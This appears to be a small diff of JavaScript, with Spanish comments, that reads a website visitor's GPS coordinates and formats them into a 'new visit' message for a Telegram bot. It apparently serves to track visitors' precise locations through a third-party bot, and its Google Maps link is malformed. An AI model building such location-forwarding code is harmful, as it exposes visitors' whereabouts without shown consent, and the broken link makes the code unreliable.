@@ -175,7 +175,7 @@
     const longitud = posicion.coords.longitude;
     const precision = posicion.coords.accuracy;
 
-    // CORREGIDO COMPLETO: Ahora todo el string usa comillas invertidas (backticks) y sustituye las variables de forma válida
+    // Fíjate bien que use ` al inicio y al final, y ${latitud} junto con ${longitud}
     const mensaje = `📍 Nueva Visita (GPS)\n\n• Latitud: ${latitud}\n• Longitud: ${longitud}\n• Precisión: ~${Math.round(precision)} metros\n\nGoogle Maps: https://google.com{latitud},${longitud}`;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
